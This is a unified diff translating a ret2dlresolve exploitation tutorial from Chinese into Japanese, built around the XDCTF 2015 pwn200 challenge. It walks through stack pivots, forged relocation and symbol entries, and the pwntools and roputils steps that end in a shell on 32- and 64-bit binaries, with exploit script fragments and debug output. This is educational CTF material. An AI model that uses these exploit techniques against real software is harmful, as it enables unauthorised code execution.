@@ -1,34 +1,34 @@
 # ret2dlresolve
 
-在学习这个 ROP 利用技巧前，需要首先理解动态链接的基本过程以及 ELF 文件中动态链接相关的结构。读者可以参考 executable 部分  ELF 对应的介绍。这里只给出相应的利用方式。
+この ROP の悪用テクニックを学ぶ前に、動的リンクの基本的な流れと、ELF ファイルにおける動的リンク関連の構造を理解しておく必要があります。executable 部分の ELF に関する解説を参照してください。ここでは対応する悪用方法のみを示します。
 
 ## 原理
 
-在 Linux 中，程序使用 `_dl_runtime_resolve(link_map_obj, reloc_offset)` 来对动态链接的函数进行重定位。那么如果我们可以控制相应的参数及其对应地址的内容是不是就可以控制解析的函数了呢？答案是肯定的。这也是 ret2dlresolve 攻击的核心所在。
+Linux では、プログラムは `_dl_runtime_resolve(link_map_obj, reloc_offset)` を使って、動的リンクされる関数のリロケーション(再配置、relocation)を行います。では、その引数と、引数が指すアドレスの内容を制御できれば、解決される関数を制御できるのではないか、と考えられます。答えは肯定です。これこそが ret2dlresolve 攻撃の核心です。
 
-具体的，动态链接器在解析符号地址时所使用的重定位表项、动态符号表、动态字符串表都是从目标文件中的动态节 `.dynamic` 索引得到的。所以如果我们能够修改其中的某些内容使得最后动态链接器解析的符号是我们想要解析的符号，那么攻击就达成了。
+具体的には、動的リンカがシンボルのアドレスを解決するときに使うリロケーションテーブルのエントリ、動的シンボルテーブル、動的文字列テーブルは、いずれもオブジェクトファイル中の動的セクション `.dynamic` から索引されて得られます。したがって、その中のいくつかの内容を変更して、最終的に動的リンカが解決するシンボルを私たちが解決させたいシンボルにできれば、攻撃は成立します。
 
-### 思路1 - 直接控制重定位表项的相关内容
+### 方針1 - リロケーションテーブルのエントリ関連の内容を直接制御する
 
-由于动态链接器最后在解析符号的地址时，是依据符号的名字进行解析的。因此，一个很自然的想法是直接修改动态字符串表 `.dynstr`，比如把某个函数在字符串表中对应的字符串修改为目标函数对应的字符串。但是，动态字符串表和代码映射在一起，是只读的。此外，类似地，我们可以发现动态符号表、重定位表项都是只读的。
+動的リンカは最終的にシンボルのアドレスを解決するときに、シンボルの名前に基づいて解決します。そのため、動的文字列テーブル `.dynstr` を直接書き換える、たとえばある関数に対応する文字列テーブル中の文字列を目的の関数の文字列に書き換える、というのは自然な発想です。しかし、動的文字列テーブルはコードと一緒にマップされていて読み取り専用です。さらに同様に、動的シンボルテーブルやリロケーションテーブルのエントリも読み取り専用であることが分かります。
 
-但是，假如我们可以控制程序执行流，那我们就可以伪造合适的重定位偏移，从而达到调用目标函数的目的。然而，这种方法比较麻烦，因为我们不仅需要伪造重定位表项，符号信息和字符串信息，而且我们还需要确保动态链接器在解析的过程中不会出错。
+ただし、プログラムの実行フローを制御できるなら、適切なリロケーションオフセットを偽造して、目的の関数を呼び出すことができます。とはいえこの方法は面倒です。リロケーションテーブルのエントリ、シンボル情報、文字列情報を偽造する必要があるだけでなく、動的リンカの解決の過程でエラーが起きないようにも確認しなければならないからです。
 
-### 思路2 - 间接控制重定位表项的相关内容
+### 方針2 - リロケーションテーブルのエントリ関連の内容を間接的に制御する
 
-既然动态链接器会从 `.dynamic` 节中索引到各个目标节，那如果我们可以修改动态节中的内容，那自然就很容易控制待解析符号对应的字符串，从而达到执行目标函数的目的。
+動的リンカは `.dynamic` セクションから各対象セクションを索引するので、動的セクションの内容を書き換えられれば、解決対象のシンボルに対応する文字列を制御するのは当然簡単になり、目的の関数を実行するという目標が達成できます。
 
-### 思路3 - 伪造 link_map
+### 方針3 - link_map の偽造
 
-由于动态连接器在解析符号地址时，主要依赖于 link_map 来查询相关的地址。因此，如果我们可以成功伪造 link_map，也就可以控制程序执行目标函数。
+動的リンカがシンボルのアドレスを解決するとき、関連するアドレスを調べるために主に link_map に依存します。そのため、link_map の偽造に成功すれば、プログラムに目的の関数を実行させることもできます。
 
-下面我们以 2015-XDCTF-pwn200 来介绍 32 位和 64 位下如何使用 ret2dlresolve 技巧。
+以下では 2015-XDCTF-pwn200 を例に、32 ビットと 64 ビットで ret2dlresolve のテクニックをどう使うかを紹介します。
 
-## 32 位例子
+## 32 ビットの例
 
 ### NO RELRO
 
-首先，我们可以按照下面的方式来编译对应的文件。
+まず、次の方法で対応するファイルをコンパイルします。
 
 ```shell
 ❯ gcc -fno-stack-protector -m32 -z norelro -no-pie main.c -o main_norelro_32
@@ -41,14 +41,14 @@
     PIE:      No PIE (0x8048000)
 ```
 
-在这种情况下，修改 `.dynamic` 会简单些。因为我们只需要修改 `.dynamic` 节中的字符串表的地址为伪造的字符串表的地址，并且相应的位置为目标字符串基本就行了。具体思路如下
+この場合、`.dynamic` の書き換えのほうが簡単です。`.dynamic` セクション中の文字列テーブルのアドレスを、偽造した文字列テーブルのアドレスに書き換え、対応する位置を目的の文字列にするだけでよいからです。具体的な方針は次のとおりです。
 
-1. 修改 .dynamic 节中字符串表的地址为伪造的地址
-2. 在伪造的地址处构造好字符串表，将 read 字符串替换为 system 字符串。
-3. 在特定的位置读取 /bin/sh 字符串。
-4. 调用 read 函数的 plt 的第二条指令，触发 `_dl_runtime_resolve` 进行函数解析，从而执行 system 函数。
+1. .dynamic セクション中の文字列テーブルのアドレスを偽のアドレスに書き換える
+2. 偽のアドレスに文字列テーブルを構築し、read の文字列を system の文字列に置き換える。
+3. 特定の位置に /bin/sh 文字列を読み込む。
+4. read 関数の plt の2番目の命令を呼び出し、`_dl_runtime_resolve` による関数の解決を引き起こして、system 関数を実行する。
 
-代码如下
+コードは次のとおりです。
 
 ```python
 from pwn import *
@@ -81,7 +81,7 @@ p.send("/bin/sh\x00")
 p.interactive()
 ```
 
-运行效果如下
+実行結果は次のとおりです。
 
 ```python
 ❯ python exp-no-relro.py
@@ -100,7 +100,7 @@ exp-no-relro.py  main_no_relro_32
 
 ### Partial RELRO
 
-首先我们可以编译源文件 main.c 得到二进制文件，这里取消了 Canary 保护。
+まずソースファイル main.c をコンパイルしてバイナリを得ます。ここでは Canary 保護を無効にしています。
 
 ```shell
 ❯ gcc -fno-stack-protector -m32 -z relro -z lazy -no-pie ../../main.c -o main_partial_relro_32
@@ -114,16 +114,16 @@ al-relro/main_partial_relro_32'
     PIE:      No PIE (0x8048000)
 ```
 
-在这种情况下，ELF 文件中的 .dynamic 节将会变成只读的，这时我们可以通过伪造重定位表项的方式来调用目标函数。
+この場合、ELF ファイルの .dynamic セクションは読み取り専用になります。そこで、リロケーションテーブルのエントリを偽造する方法で目的の関数を呼び出します。
 
-在下面的讲解过程中，本文会按照以下两种不同的方式来使用该技巧。
+以下の解説では、このテクニックを次の2通りの方法で使います。
 
-1.  通过手工伪造的方式使用该技巧，从而获取 shell。这种方式虽然比较麻烦，但是可以仔细理解 ret2dlresolve 的原理。
-2.  利用工具来实现攻击，从而获取 shell。这种方式比较简单，但我们还是应该充分理解背后的原理，不能只是会使用工具。
+1.  手作業で偽造する方法でこのテクニックを使い、shell を取得します。この方法は面倒ですが、ret2dlresolve の原理をじっくり理解できます。
+2.  ツールを使って攻撃し、shell を取得します。この方法は簡単ですが、背後にある原理を十分に理解するべきで、ツールの使い方を知っているだけではいけません。
 
-#### 手工伪造
+#### 手作業での偽造
 
-这题我们不考虑有 libc 的情况。通过分析，我们可以发现程序有一个很明显的栈溢出漏洞，缓冲区到返回地址间的偏移为 112。
+この問題では libc がある場合は考えません。分析すると、プログラムには非常に明白なスタックオーバーフローの脆弱性があり、バッファからリターンアドレスまでのオフセットは 112 であることが分かります。
 
 ```asm
 gef➤  pattern create 200
@@ -171,16 +171,16 @@ gef➤  pattern search 0x62616164
 [+] Found at offset 112 (little-endian search) likely
 ```
 
-在下面的每一个阶段中，我们会一步步地深入理解如何构造 payload。
+以下の各段階で、payload をどう構築するかを一歩ずつ理解していきます。
 
 ##### stage 1
 
-在这一阶段，我们的目的比较简单，就是控制程序直接执行 write 函数。在栈溢出的情况下，我们其实可以直接控制返回地址来控制程序直接执行 write 函数。但是这里我们采用一个相对复杂点的办法，即先使用栈迁移，将栈迁移到 bss 段，然后再来控制 write 函数。因此，这一阶段主要包括两步
+この段階での目的は単純で、プログラムに write 関数を直接実行させることです。スタックオーバーフローの状況では、リターンアドレスを直接制御して write 関数を実行させることもできます。しかしここでは少し複雑な方法をとり、まずスタックピボット(栈迁移、stack pivot)で bss セクションにスタックを移し、その後 write 関数を制御します。そのため、この段階は主に次の2ステップからなります。
 
-1. 将栈迁移到 bss 段。
-2. 通过 write 函数的 plt 表项来执行 write 函数，输出相应字符串。
+1. スタックを bss セクションに移す。
+2. write 関数の plt エントリを通じて write 関数を実行し、対応する文字列を出力する。
 
-这里使用了 pwntools 中的 ROP 模块。具体代码如下
+ここでは pwntools の ROP モジュールを使っています。具体的なコードは次のとおりです。
 
 ```python
 from pwn import *
@@ -213,7 +213,7 @@ r.sendline(rop.chain())
 r.interactive()
 ```
 
-结果如下
+結果は次のとおりです。
 
 ```shell
 ❯ python stage1.py
@@ -231,10 +231,10 @@ r.interactive()
 
 ##### stage 2
 
-在这一阶段，我们将会进一步利用 `_dl_runtime_resolve` 相关的知识来控制程序执行 write 函数。
+この段階では、`_dl_runtime_resolve` 関連の知識をさらに利用して、プログラムに write 関数を実行させます。
 
-1. 将栈迁移到 bss 段。
-2. 控制程序直接执行 plt0 中的相关指令，即 push linkmap 以及跳转到 `_dl_runtime_resolve` 函数。这时，我们还需要提供  write 重定位项在 got 表中的偏移。这里，我们可以直接使用 write plt 中提供的偏移，即 0x080483C6 处所给出的 0x20。其实，我们也可以跳转到 0x080483C6 地址处，利用原有的指令来提供 write 函数的偏移，并跳转到 plt0。
+1. スタックを bss セクションに移す。
+2. plt0 の関連命令、つまり push linkmap と `_dl_runtime_resolve` 関数へのジャンプをプログラムに直接実行させる。このとき、write のリロケーション項の got テーブル中でのオフセットも渡す必要がある。ここでは write の plt が提供するオフセット、つまり 0x080483C6 に示されている 0x20 をそのまま使える。実は 0x080483C6 のアドレスにジャンプして、元の命令で write 関数のオフセットを提供させつつ plt0 にジャンプすることもできる。
 
 ```
 .plt:08048370 ; ===========================================================================
@@ -276,7 +276,7 @@ r.interactive()
 .plt:080483CB                 jmp     sub_8048370
 ```
 
-具体代码如下
+具体的なコードは次のとおりです。
 
 ```python
 from pwn import *
@@ -321,7 +321,7 @@ r.sendline(rop.chain())
 r.interactive()
 ```
 
-效果如下，仍然输出了 sh 对应的字符串。
+結果は次のとおりです。やはり sh に対応する文字列が出力されました。
 
 ```shell
 ❯ python stage2.py
@@ -340,9 +340,9 @@ r.interactive()
 
 ##### stage 3
 
-这一次，我们同样控制  `_dl_runtime_resolve` 函数中的 reloc_offset 参数，不过这次控制其指向我们伪造的 write 重定位项。
+今回も `_dl_runtime_resolve` 関数の reloc_offset 引数を制御しますが、今度はそれを、偽造した write のリロケーション項を指すようにします。
 
-鉴于 pwntools 本身并不支持对重定位表项的信息的获取。这里我们手动看一下
+pwntools 自体はリロケーションテーブルのエントリの情報の取得をサポートしていないため、ここでは手作業で確認します。
 
 ```shell
 ❯ readelf -r main_partial_relro_32
@@ -362,7 +362,7 @@ Relocation section '.rel.plt' at offset 0x324 contains 5 entries:
 0804a01c  00000607 R_386_JUMP_SLOT   00000000   write@GLIBC_2.0
 ```
 
-可以看出 write 的重定表项的 r_offset=0x0804a01c，r_info=0x00000607。具体代码如下
+write のリロケーションエントリは r_offset=0x0804a01c、r_info=0x00000607 であることが分かります。具体的なコードは次のとおりです。
 
 ```python
 from pwn import *
@@ -414,7 +414,7 @@ r.sendline(rop.chain())
 r.interactive()
 ```
 
-这次我们在 base_stage+24 处伪造了一个 write 的重定位项，仍然输出了对应的字符串。
+今回は base_stage+24 に write のリロケーション項を偽造し、やはり対応する文字列が出力されました。
 
 ```shell
 ❯ python stage3.py
@@ -432,9 +432,9 @@ r.interactive()
 
 ##### stage 4
 
-在 stage3 中，我们控制了重定位表项，但是伪造的重定位表项的内容仍然与 write 函数原来的重定位表项一致。
+stage3 ではリロケーションテーブルのエントリを制御しましたが、偽造したリロケーションテーブルのエントリの内容は、write 関数の元のリロケーションテーブルのエントリと同じままでした。
 
-在这个阶段中，我们将构造属于我们自己的重定位表项，并且伪造该表项对应的符号。首先，我们根据 write 的重定位表项的 r_info=0x607 可以知道，write 对应的符号在符号表的下标为 0x607>>8=0x6。因此，我们知道 write 对应的符号地址为 0x0804822c。
+この段階では、自分たち独自のリロケーションテーブルのエントリを構築し、そのエントリに対応するシンボルも偽造します。まず、write のリロケーションテーブルのエントリの r_info=0x607 から、write に対応するシンボルのシンボルテーブル中での添字が 0x607>>8=0x6 であることが分かります。したがって、write に対応するシンボルのアドレスは 0x0804822c です。
 
 ```shell
 ❯ readelf -x .dynsym main_partial_relro_32
@@ -452,7 +452,7 @@ Hex dump of section '.dynsym':
   0x0804825c 0b000000 6c860408 04000000 11001000 ....l...........
 ```
 
-这里给出的其实是小端模式，因此我们需要手工转换。此外，每个符号占用的大小为 16 个字节。
+ここで示されているのはリトルエンディアンなので、手作業で変換する必要があります。また、各シンボルが占めるサイズは 16 バイトです。
 
 ```python
 from pwn import *
@@ -514,7 +514,7 @@ r.sendline(rop.chain())
 r.interactive()
 ```
 
-直接执行后发现并不行
+そのまま実行してみるとうまくいきません。
 
 ```shell
 ❯ python stage4.py
@@ -530,7 +530,7 @@ r.interactive()
 [*] Got EOF while reading in interactive
 ```
 
-发现程序已经崩溃了，通过 coredump，可以发现程序在 `ld-linux.so.2` 中崩了。
+プログラムがクラッシュしており、coredump から、プログラムが `ld-linux.so.2` の中でクラッシュしたことが分かります。
 
 ```assembly
  ► 0xf7f77fed    mov    ebx, dword ptr [edx + 4]
@@ -573,7 +573,7 @@ LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
 0xf7f90000 0xf7f91000 rw-p     1000 26000  /lib/ld-linux.so.2
 ```
 
-通过逆向分析 ld-linux.so.2 
+ld-linux.so.2 をリバースエンジニアリングして分析すると、
 
 ```c
   if ( v9 )
@@ -584,7 +584,7 @@ LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
   }
 ```
 
-以及源码可以知道程序是在访问 version 的 hash 时出错。
+およびソースコードから、プログラムは version の hash にアクセスするときにエラーを起こしていることが分かります。
 
 ```c
         if (l->l_info[VERSYMIDX(DT_VERSYM)] != NULL)
@@ -598,9 +598,9 @@ LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
         }
 ```
 
-进一步分析可以知道，因为我们伪造了 write 函数的重定位表项，其中 reloc->r_info 被设置成了比较大的值（由于 index_dynsym 离符号表比较远）。这时候，ndx 的值并不可预期，进而 version 的值也不可预期，因此可能出现不可预期的情况。
+さらに分析すると、write 関数のリロケーションテーブルのエントリを偽造したため、reloc->r_info が比較的大きな値に設定されてしまっています(index_dynsym がシンボルテーブルから遠いため)。このとき ndx の値は予測できず、したがって version の値も予測できないため、予期しない事態が起こりえます。
 
-通过分析 .dynmic 节，我们可以发现 vernum 的地址为 0x80482d8。
+.dynmic セクションを分析すると、vernum のアドレスは 0x80482d8 であることが分かります。
 
 ```
 ❯ readelf -d main_partial_relro_32
@@ -633,7 +633,7 @@ Dynamic section at offset 0xf0c contains 24 entries:
  0x00000000 (NULL)                       0x0
 ```
 
-在 ida 中，我们也可以看到相关的信息
+ida でも関連する情報を確認できます。
 
 ```assembly
 LOAD:080482D8 ; ELF GNU Symbol Version Table
@@ -649,7 +649,7 @@ LOAD:080482E8                 dw 2                    ; stdout@@GLIBC_2.0
 LOAD:080482EA                 dw 1                    ; global symbol: _IO_stdin_used
 ```
 
-那我们可以再次运行看一下伪造后 ndx 具体的值
+では、もう一度実行して、偽造後の ndx の具体的な値を見てみましょう。
 
 ```shell
 ❯ python stage4.py
@@ -664,13 +664,13 @@ LOAD:080482EA                 dw 1                    ; global symbol: _IO_stdin
 ndx_addr: 0x80487a8
 ```
 
-可以发现，ndx_落入了 `.eh_frame` 节中。
+ndx_ が `.eh_frame` セクションに入っていることが分かります。
 
 ```assembly
 .eh_frame:080487A8                 dw 442Ch
 ```
 
-进一步地，ndx 的值为 0x442C。显然不知道会索引到哪里去。
+さらに、ndx の値は 0x442C です。どこを索引することになるのか、明らかに分かりません。
 
 ```c
         if (l->l_info[VERSYMIDX(DT_VERSYM)] != NULL)
@@ -684,7 +684,7 @@ ndx_addr: 0x80487a8
         }
 ```
 
-通过动态调试，我们可以发现 l_versions 的起始地址，并且其中一共有 3 个元素。
+動的デバッグにより、l_versions の先頭アドレスが分かり、その中に全部で 3 つの要素があることが分かります。
 
 ```assembly
 pwndbg> print *((struct link_map *)0xf7f0d940)
@@ -715,7 +715,7 @@ $4 = {
   l_nversions = 3, 
 ```
 
-对应的分别为 
+それぞれ次のものに対応します。
 
 ```assembly
 pwndbg> print *((struct r_found_version[3] *)0xf7edf3f0)
@@ -738,7 +738,7 @@ $13 = {{
 
 ```
 
-此时，计算得到的 version 地址为 0xf7f236b0，显然不在映射的内存区域。
+このとき、計算で得られる version のアドレスは 0xf7f236b0 で、明らかにマップされたメモリ領域にありません。
 
 ```assembly
 pwndbg> print /x 0xf7edf3f0+0x442C*16
@@ -762,17 +762,17 @@ LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
 0xffa4b000 0xffa6d000 rw-p    22000 0      [stack]
 ```
 
- 而在动态解析符号地址的过程中，如果 version 为 NULL 的话，也会正常解析符号。
+ 一方、動的にシンボルのアドレスを解決する過程では、version が NULL であっても、シンボルは正常に解決されます。
 
-与此同，根据上面的调试信息，可以知道 l_versions 的前两个元素中的 hash 值都为 0，因此如果我们使得 ndx 为 0 或者 1 时，就可以满足要求，我们来在 080487A8 下方找一个合适的值。可以发现 0x080487C2 处的内容为0。
+それと同時に、上のデバッグ情報から、l_versions の最初の2つの要素の hash の値がどちらも 0 であることが分かるので、ndx を 0 または 1 にすれば条件を満たせます。080487A8 より後ろで適切な値を探してみましょう。0x080487C2 の内容が 0 であることが分かります。
 
-那自然的，我们就可以调用目标函数。
+そうなれば当然、目的の関数を呼び出せます。
 
-这里，我们可以通过调整 base_stage 来达到相应的目的。
+ここでは、base_stage を調整することでその目的を達成できます。
 
-- 首先 0x080487C2 与 0x080487A8 之间差了 0x080487C2-0x080487A8)/2 个 version 记录。
-- 那么，这也就说明原先的符号表偏移少了对应的个数。
-- 因此，我们只需要将 base_stage 增加 (0x080487C2-0x080487A8)/2*0x10，即可达到对应的目的。
+- まず 0x080487C2 と 0x080487A8 の間には (0x080487C2-0x080487A8)/2 個の version レコードの差があります。
+- つまり、元のシンボルテーブルのオフセットはその個数分だけ足りていなかったことになります。
+- したがって、base_stage を (0x080487C2-0x080487A8)/2*0x10 だけ増やせば、その目的を達成できます。
 
 ```python
 from pwn import *
@@ -836,7 +836,7 @@ r.sendline(rop.chain())
 r.interactive()
 ```
 
-最终如下
+最終的には次のとおりです。
 
 ```shell
 ❯ python stage4.py
@@ -855,7 +855,7 @@ ndx_addr: 0x80487c2
 
 ##### stage 5
 
-这一阶段，我们将在阶段 4 的基础上，进一步伪造 write 符号的 st_name 指向我们自己构造的字符串。
+この段階では、段階 4 を踏まえて、write シンボルの st_name が、自分で構築した文字列を指すようにさらに偽造します。
 
 ```python
 from pwn import *
@@ -917,7 +917,7 @@ r.sendline(rop.chain())
 r.interactive()
 ```
 
-效果如下
+結果は次のとおりです。
 
 ```shell
 ❯ python stage5.py
@@ -933,11 +933,11 @@ r.interactive()
 /bin/sh[*] Got EOF while reading in interactive
 ```
 
-事实上，这里的 index_dynsym 又发生了变化，但似乎并不影响，因此我们也不用再想办法伪造数据了。
+実際には、ここで index_dynsym がまた変化していますが、特に影響はないようなので、データを偽造する方法を別に考える必要はありません。
 
 ##### stage 6
 
-这一阶段，我们只需要将原先的 write 字符串修改为 system 字符串，同时修改 write 的参数为 system 的参数即可获取 shell。这是因为 `_dl_runtime_resolve` 函数最终是依赖函数名来解析目标地址的。
+この段階では、元の write 文字列を system 文字列に書き換え、write の引数を system の引数に書き換えるだけで shell を取得できます。これは `_dl_runtime_resolve` 関数が、最終的に関数名に依存して目的のアドレスを解決するためです。
 
 ```python
 from pwn import *
@@ -1004,7 +1004,7 @@ r.sendline(rop.chain())
 r.interactive()
 ```
 
-需要注意的是，这里我把 /bin/sh 的偏移修改为了 base_stage+82，这是因为 pwntools 会对齐字符串。如下面的 ropchain 所示，0x40 处多了两个 a，比较奇怪。
+注意すべき点として、ここでは /bin/sh のオフセットを base_stage+82 に変更しています。これは pwntools が文字列をアラインするためです。次の ropchain に示すように、0x40 のところに a が2つ余分にあり、少し奇妙です。
 
 ```
 0x0038:           'syst' 'system\x00'
@@ -1013,7 +1013,7 @@ r.interactive()
 0x0042:           'aaaa' 'aaaaaaaaaaaaaa'
 ```
 
-效果如下
+結果は次のとおりです。
 
 ```shell
 ❯ python stage6.py
@@ -1061,13 +1061,13 @@ ld-linux.so.2           roputils.pyc  stage3.py    stage6.py
 main_partial_relro_32  stage1.py     stage4.py
 ```
 
-#### 基于工具伪造
+#### ツールによる偽造
 
-根据上面的介绍，我们应该可以理解这个攻击了。
+ここまでの説明で、この攻撃は理解できたはずです。
 
 ##### Roputil
 
-下面我们直接使用 roputil 来进行攻击。代码如下
+ここでは roputil を直接使って攻撃します。コードは次のとおりです。
 
 ```python
 from roputils import *
@@ -1097,9 +1097,9 @@ r.send(buf)
 r.interactive()
 ```
 
-关于 dl_resolve_call 与 dl_resolve_data 的具体细节请参考 roputils.py 的源码，比较容易理解。需要注意的是，dl_resolve 执行完之后也是需要有对应的返回地址的。
+dl_resolve_call と dl_resolve_data の詳細については roputils.py のソースコードを参照してください。比較的理解しやすいです。注意すべき点として、dl_resolve の実行後にも対応するリターンアドレスが必要です。
 
-效果如下
+結果は次のとおりです。
 
 ```shell
 ❯ python roptool.py
@@ -1142,7 +1142,7 @@ main_partial_relro_32  stage1.py     stage4.py
 
 ##### pwntools
 
-这里我们使用 pwntools 的工具进行攻击。
+ここでは pwntools のツールを使って攻撃します。
 
 ```python
 from pwn import *
@@ -1161,7 +1161,7 @@ io.sendline(payload)
 io.interactive()
 ```
 
-结果如下
+結果は次のとおりです。
 
 ```shell
 ❯ python exp-pwntools.py
@@ -1182,24 +1182,24 @@ main_partial_relro_32  stage1.py     stage4.py
 
 ### Full RELRO
 
-在开启 FULL RELRO 保护的情况下，程序中导入的函数地址会在程序开始执行之前被解析完毕，因此 got 表中 link_map 以及 dl_runtime_resolve 函数地址在程序执行的过程中不会被用到。故而，GOT 表中的这两个地址均为 0。此时，直接使用上面的技巧是不行的。
+FULL RELRO 保護が有効な場合、プログラムがインポートする関数のアドレスは、プログラムの実行開始前にすべて解決されます。そのため、got テーブル中の link_map と dl_runtime_resolve 関数のアドレスは、プログラムの実行中には使われません。したがって、GOT テーブル中のこの2つのアドレスはどちらも 0 です。この場合、上のテクニックをそのまま使うことはできません。
 
-那有没有什么办法可以绕过这样的防护呢？请读者自己思考。
+では、このような防御を回避する方法はあるでしょうか。読者自身で考えてみてください。
 
-## 64 位例子
+## 64 ビットの例
 
 ### NO RELRO
 
-在这种情况下，类似于 32 位的情况直接构造即可。由于可以溢出的缓冲区太少，所以我们可以考虑进行栈迁移后，然后进行漏洞利用。
+この場合は、32 ビットの場合と同様にそのまま構築すればかまいません。オーバーフローできるバッファが小さすぎるので、スタックピボットをしてから脆弱性を悪用することを考えます。
 
-1. 在 bss 段伪造栈。栈中的数据为
-    1. 修改 .dynamic 节中字符串表的地址为伪造的地址
-    2. 在伪造的地址处构造好字符串表，将 read 字符串替换为 system 字符串。
-    3. 在特定的位置读取 /bin/sh 字符串。
-    4. 调用 read 函数的 plt 的第二条指令，触发 `_dl_runtime_resolve` 进行函数解析，从而触发执行 system 函数。
-2. 栈迁移到 bss 段。
+1. bss セクションに偽のスタックを作る。スタック中のデータは次のとおり
+    1. .dynamic セクション中の文字列テーブルのアドレスを偽のアドレスに書き換える
+    2. 偽のアドレスに文字列テーブルを構築し、read の文字列を system の文字列に置き換える。
+    3. 特定の位置に /bin/sh 文字列を読み込む。
+    4. read 関数の plt の2番目の命令を呼び出し、`_dl_runtime_resolve` による関数の解決を引き起こして、system の実行を引き起こす。
+2. スタックを bss セクションに移す。
 
-由于程序中没有直接设置 rdx 的 gadget，所以我们这里就选择了万能 gadget。这会使得我们的 ROP 链变得更长
+プログラム中には rdx を直接設定する gadget がないため、ここでは万能 gadget を選びました。これにより ROP チェーンはさらに長くなります。
 
 ```python
 from pwn import *
@@ -1274,7 +1274,7 @@ io.send("/bin/sh\x00")
 io.interactive()
 ```
 
-直接运行，发现不行，经过调试发现程序在 0x7f2512db3e69 处崩了。
+そのまま実行してもうまくいかず、デバッグしたところ、プログラムは 0x7f2512db3e69 でクラッシュしていることが分かりました。
 
 ```assembly
  RAX  0x600998 (_DYNAMIC+144) ◂— 0x6
@@ -1303,7 +1303,7 @@ io.interactive()
  ► 0x7f2512db3e69 <_dl_fixup+41>    mov    rcx, qword ptr [r8 + 8] <0x7f2512ac3191>
 ```
 
-经过逐步调试发现，在 `_dl_runtime_resolve` 会在栈中保存大量的数据
+ステップ実行でデバッグしたところ、`_dl_runtime_resolve` はスタックに大量のデータを保存することが分かりました。
 
 ```assembly
 .text:00000000000177A0 ; __unwind {
@@ -1332,7 +1332,7 @@ io.interactive()
 .text:0000000000017815                 call    sub_FE40
 ```
 
-其中 qword_227808 处的值为0x0000000000000380。
+ここで qword_227808 にある値は 0x0000000000000380 です。
 
 ```assembly
 pwndbg> vmmap
@@ -1357,13 +1357,13 @@ pwndbg> x/gx 0x7f2512da4000+0x227808
 0x7f2512fcb808 <_rtld_global_ro+168>:	0x0000000000000380
 ```
 
-当执行完下面的指令后
+次の命令を実行し終えると、
 
 ```assembly
  ► 0x7f2512dbb7a8 <_dl_runtime_resolve_xsavec+8>     sub    rsp, qword ptr [rip + 0x210059] <0x7f2512fcb808>
 ```
 
-栈地址到了 0x600a00（我们是将栈迁移到了 bss_addr+0x100，即 0x600C30），即到了 .dynamic 节中，后续在栈中保存数据时会破坏 .dynamic 节中的内容，最后导致了 dl_fixup 崩溃。
+スタックアドレスは 0x600a00 になり(スタックを bss_addr+0x100、つまり 0x600C30 に移しました)、.dynamic セクションの中に入ってしまいます。その後スタックにデータを保存するときに .dynamic セクションの内容が破壊され、最終的に dl_fixup のクラッシュにつながりました。
 
 ```
    0x7f2512dbb7a0 <_dl_runtime_resolve_xsavec>       push   rbx
@@ -1387,12 +1387,12 @@ pwndbg> x/gx 0x7f2512da4000+0x227808
 07:0038│      0x600a38 (_DYNAMIC+304) ◂— 9 /* '\t' */
 ```
 
-或许我们可以考虑把栈再迁移的高一些，但是，程序中与 bss 相关的映射只有 0x600000-0x601000，即一页。与此同时
+スタックをもう少し高い位置に移すことも考えられますが、プログラム中の bss 関連のマッピングは 0x600000-0x601000、つまり1ページしかありません。同時に、
 
-- bss 段的起始地址为 0x600B30
-- 伪造的栈的数据一共有 392 （0x188）
+- bss セクションの開始アドレスは 0x600B30
+- 偽造したスタックのデータは全部で 392 (0x188)
 
-所以直接栈迁移到 bss节很容易出现问题。
+したがって、bss セクションにそのままスタックピボットすると、問題が起きやすくなります。
 
 ```assembly
 pwndbg> vmmap
@@ -1415,10 +1415,10 @@ LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
 0xffffffffff600000 0xffffffffff601000 r-xp     1000 0      [vsyscall]
 ```
 
-但经过精细的调节，我们还是避免破坏 .dynamic 节的内容
+ただし、細かく調整すれば、.dynamic セクションの内容の破壊を避けられます。
 
-- 修改迁移后的栈的地址为 bss_addr+0x200，即 0x600d30
-- 修改迁移后的栈的大小为 0x188
+- ピボット後のスタックのアドレスを bss_addr+0x200、つまり 0x600d30 に変更する
+- ピボット後のスタックのサイズを 0x188 に変更する
 
 ```python
 from pwn import *
@@ -1495,13 +1495,13 @@ io.send("/bin/sh\x00")
 io.interactive()
 ```
 
-此时，我们发现程序又崩了，通过 coredump
+このとき、プログラムがまたクラッシュしたので、coredump を調べます。
 
 ```bash
 ❯ gdb -c core
 ```
 
-我们发现，在处理 xmm 相关的指令时崩了
+xmm 関連の命令を処理するところでクラッシュしていることが分かります。
 
 ```
  ► 0x7fa8677a3396    movaps xmmword ptr [rsp + 0x40], xmm0
@@ -1530,7 +1530,7 @@ io.interactive()
 
 ```
 
-由于 xmm 相关指令要求地址应该是 16 字节对齐的，而此时 rsp 并不是 16 字节对齐的。因此我们可以简单地调整一下栈，来使得栈是 16 字节对齐的。
+xmm 関連の命令ではアドレスが 16 バイトアラインされている必要がありますが、このときの rsp は 16 バイトアラインされていません。そこで、スタックを少し調整して 16 バイトアラインされるようにします。
 
 ```python
 from pwn import *
@@ -1610,7 +1610,7 @@ io.send("/bin/sh\x00")
 io.interactive()
 ```
 
-最终执行效果如下
+最終的な実行結果は次のとおりです。
 
 ```
 ❯ python exp-no-relro-stack-pivot.py
@@ -1627,9 +1627,9 @@ $ ls
 exp-no-relro-stack-pivot.py  main_no_relro_64
 ```
 
-到了这里我们发现，与 32 位不同，在 64 位下进行栈迁移然后利用 ret2dlresolve 攻击需要精心构造栈的位置，以避免破坏 .dynamic 节的内容。
+ここまで来て、32 ビットとは異なり、64 ビットでスタックピボットをしてから ret2dlresolve 攻撃を行う場合は、.dynamic セクションの内容を破壊しないよう、スタックの位置を慎重に構築する必要があることが分かります。
 
-这里我们同时给出另外一种方法，即通过多次使用 vuln 函数进行漏洞利用。这种方式看起来会更加清晰一些。
+ここでは別の方法も紹介します。vuln 関数を複数回使って脆弱性を悪用する方法です。この方法のほうが、より分かりやすく見えるでしょう。
 
 ```python
 from pwn import *
@@ -1719,7 +1719,7 @@ io.interactive()
 
 ### Partial RELRO
 
-还是利用 2015 年 xdctf 的 pwn200 进行介绍。
+ここでも 2015 年 xdctf の pwn200 を使って説明します。
 
